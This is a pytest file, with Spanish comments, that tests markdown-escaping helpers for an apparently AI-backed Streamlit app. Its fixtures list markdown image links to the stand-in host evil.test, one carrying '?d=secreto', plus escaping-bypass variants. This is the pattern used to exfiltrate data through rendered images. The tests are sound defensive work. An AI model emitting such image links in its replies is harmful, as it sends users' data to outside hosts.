"""Escaping helpers used by the screens."""

import pytest

from ui_utils import respuesta_segura, texto_seguro


@pytest.mark.parametrize(
    "entrada",
    [
        "![x](https://evil.test/p.png)",
        "[link](https://evil.test)",
        ":red[hola]",
        "$x^2$",
        "# título",
    ],
)
def test_texto_seguro_neutraliza_markdown(entrada):
    salida = texto_seguro(entrada)
    assert "](https://" not in salida and ":red[" not in salida
    assert salida.replace("\\\\", "") != entrada or not any(c in entrada for c in "![]:$#")


def _imagenes(markdown: str) -> list:
    """Image nodes a CommonMark parser finds (Streamlit renders CommonMark + GFM)."""

    from markdown_it import MarkdownIt

    tokens = MarkdownIt("commonmark").parse(markdown)
    return [hijo for token in tokens for hijo in (token.children or []) if hijo.type == "image"]


VARIANTES_DE_IMAGEN = [
    "![x](https://evil.test/p.png?d=secreto)",
    "![](https://evil.test/p.png)",
    "![a [b]](https://evil.test/p.png)",  # corchetes anidados
    "[plano]: https://evil.test/p.png\n\n![plano]",  # referencia abreviada
    "![plano][ref]\n\n[ref]: https://evil.test/p.png",  # referencia completa
    "\\![x](https://evil.test/p.png)",  # una barra: la barra se escapa, el ! no
    "\\\\\\![x](https://evil.test/p.png)",  # tres barras
    "texto ![x](<https://evil.test/a b.png>) texto",
    "- lista ![x](https://evil.test/p.png)\n- otra",
    "**![x](https://evil.test/p.png)**",
    "\\\\![x](https://evil.test/p.png)",  # dos barras: barra literal + imagen
]


@pytest.mark.parametrize("entrada", VARIANTES_DE_IMAGEN)
def test_respuesta_segura_no_deja_ninguna_imagen(entrada):
    """Ninguna variante produce un nodo de imagen tras el filtro."""

    assert _imagenes(respuesta_segura(entrada)) == []


@pytest.mark.parametrize(
    "entrada",
    [
        "**Total:** ARS 1.000 y [fuente](https://ok.test)",
        "- Fundaciones: excedido\n- Estructura: dentro del presupuesto",
        "¡Listo! Cargué el gasto.",
        "Ya está escapado: \\![x]",
    ],
)
def test_respuesta_segura_respeta_el_resto(entrada):
    assert respuesta_segura(entrada) == entrada


def test_las_variantes_son_imagenes_reales():
    """Sin el filtro, casi todas las variantes sí cargarían una imagen."""

    assert sum(bool(_imagenes(v)) for v in VARIANTES_DE_IMAGEN) >= len(VARIANTES_DE_IMAGEN) - 2
